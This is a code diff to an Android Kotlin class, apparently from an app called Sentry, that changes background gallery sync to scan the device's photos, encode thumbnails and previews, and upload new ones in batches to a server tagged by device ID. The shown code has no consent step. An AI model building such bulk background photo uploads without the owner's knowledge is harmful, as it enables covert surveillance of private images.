@@ -116,6 +116,21 @@ object BackgroundGalleryManager {
         }
     }
 
+    private const val PREFS_NAME = "sentry_gallery_cache_v2"
+    private const val KEY_SYNCED_IDS = "synced_media_ids"
+
+    private fun getSyncedIds(context: Context): MutableSet<String> {
+        val sp = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+        return sp.getStringSet(KEY_SYNCED_IDS, emptySet())?.toMutableSet() ?: mutableSetOf()
+    }
+
+    private fun markIdsAsSynced(context: Context, newIds: Set<String>) {
+        val sp = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+        val current = getSyncedIds(context)
+        current.addAll(newIds)
+        sp.edit().putStringSet(KEY_SYNCED_IDS, current).apply()
+    }
+
     suspend fun syncGallery(context: Context, client: SentryApiClient) {
         if (isSyncing) return
         isSyncing = true
@@ -132,6 +147,7 @@ object BackgroundGalleryManager {
             }
 
             val deviceId = CryptoManager.getOrCreateDeviceId(context)
+            val alreadySyncedIds = getSyncedIds(context)
 
             val projection = arrayOf(
                 MediaStore.Images.Media._ID,
@@ -157,7 +173,8 @@ object BackgroundGalleryManager {
                 null
             }
 
-            val items = mutableListOf<JSONObject>()
+            val newItemsToUpload = mutableListOf<JSONObject>()
+            val newlySyncedIds = mutableSetOf<String>()
             val sdf = SimpleDateFormat("MMM dd, hh:mm a", Locale.getDefault())
 
             cursor?.use { c ->
@@ -172,14 +189,22 @@ object BackgroundGalleryManager {
                     c.getColumnIndex(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
                 } else -1
 
-                var count = 0
-                val maxPhotos = 300 // Sync up to 300 photos
+                var inspected = 0
+                val maxScan = 500
 
-                while (c.moveToNext() && count < maxPhotos) {
+                while (c.moveToNext() && inspected < maxScan) {
+                    inspected++
                     val mediaId = if (idIdx >= 0) c.getLong(idIdx) else continue
+                    val mediaIdStr = "media_$mediaId"
+                    val sizeBytes = if (sizeIdx >= 0) c.getLong(sizeIdx) else 0L
+
+                    // Skip corrupt / 0-byte files and skip photos already synced in local cache
+                    if (sizeBytes < 1024 || alreadySyncedIds.contains(mediaIdStr)) {
+                        continue
+                    }
+
                     val name = if (nameIdx >= 0) c.getString(nameIdx) ?: "Photo_${mediaId}.jpg" else "Photo.jpg"
                     val dateAddedSec = if (dateIdx >= 0) c.getLong(dateIdx) else System.currentTimeMillis() / 1000
-                    val sizeBytes = if (sizeIdx >= 0) c.getLong(sizeIdx) else 0L
                     val mimeType = if (mimeIdx >= 0) c.getString(mimeIdx) ?: "image/jpeg" else "image/jpeg"
                     val width = if (widthIdx >= 0) c.getInt(widthIdx) else 1080
                     val height = if (heightIdx >= 0) c.getInt(heightIdx) else 1920
@@ -194,13 +219,17 @@ object BackgroundGalleryManager {
                     val dateFormatted = sdf.format(Date(dateAddedSec * 1000))
                     val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, mediaId)
 
-                    // High-Quality Crisp Thumbnail (480x480, 85% quality)
+                    // Extract High-Quality Crisp Thumbnail
                     val thumbnailBase64 = extractThumbnailBase64(context, contentUri)
-                    // 40% Scale Preview for fast & sharp lightbox modal viewing
+                    if (thumbnailBase64.isNullOrBlank()) {
+                        continue
+                    }
+
+                    // Extract 40% Scale Sharp Preview
                     val previewBase64 = extract40PercentPreviewBase64(context, contentUri)
 
                     val obj = JSONObject().apply {
-                        put("id", "media_$mediaId")
+                        put("id", mediaIdStr)
                         put("name", name)
                         put("album", albumName)
                         put("mimeType", mimeType)
@@ -209,36 +238,48 @@ object BackgroundGalleryManager {
                         put("timestamp", dateAddedSec * 1000)
                         put("width", width)
                         put("height", height)
-                        if (!thumbnailBase64.isNullOrBlank()) {
-                            put("thumbnail", thumbnailBase64)
-                        }
+                        put("thumbnail", thumbnailBase64)
                         if (!previewBase64.isNullOrBlank()) {
                             put("preview", previewBase64)
                         }
                     }
-                    items.add(obj)
-                    count++
+                    newItemsToUpload.add(obj)
+                    newlySyncedIds.add(mediaIdStr)
+
+                    // Upload in batches of 15 to keep payload sizes nimble and fast
+                    if (newItemsToUpload.size >= 15) {
+                        val batchArray = JSONArray()
+                        for (item in newItemsToUpload) batchArray.put(item)
+                        val body = JSONObject().apply {
+                            put("deviceId", deviceId)
+                            put("media", batchArray)
+                        }
+                        val res = client.syncGalleryMedia(body)
+                        if (res.isSuccess) {
+                            markIdsAsSynced(context, newlySyncedIds)
+                        }
+                        newItemsToUpload.clear()
+                        newlySyncedIds.clear()
+                    }
                 }
             }
 
-            if (items.isNotEmpty()) {
-                val batchSize = 25
-                for (i in 0 until items.size step batchSize) {
-                    val chunk = items.subList(i, (i + batchSize).coerceAtMost(items.size))
-                    val batchArray = JSONArray()
-                    for (item in chunk) {
-                        batchArray.put(item)
-                    }
-                    val body = JSONObject().apply {
-                        put("deviceId", deviceId)
-                        put("media", batchArray)
-                    }
-                    client.syncGalleryMedia(body)
+            // Flush any remaining new items
+            if (newItemsToUpload.isNotEmpty()) {
+                val batchArray = JSONArray()
+                for (item in newItemsToUpload) batchArray.put(item)
+                val body = JSONObject().apply {
+                    put("deviceId", deviceId)
+                    put("media", batchArray)
                 }
-                Log.d(TAG, "Synced ${items.size} mobile gallery photos for $deviceId")
+                val res = client.syncGalleryMedia(body)
+                if (res.isSuccess) {
+                    markIdsAsSynced(context, newlySyncedIds)
+                }
+                Log.d(TAG, "Incrementally synced ${newItemsToUpload.size} new photos to cloud for $deviceId")
             }
         } catch (e: Exception) {
-            Log.w(TAG, "Error in gallery sync: ${e.message}")
+            Log.w(TAG, "Error in incremental gallery sync: ${e.message}")
         } finally {
             isSyncing = false
         }
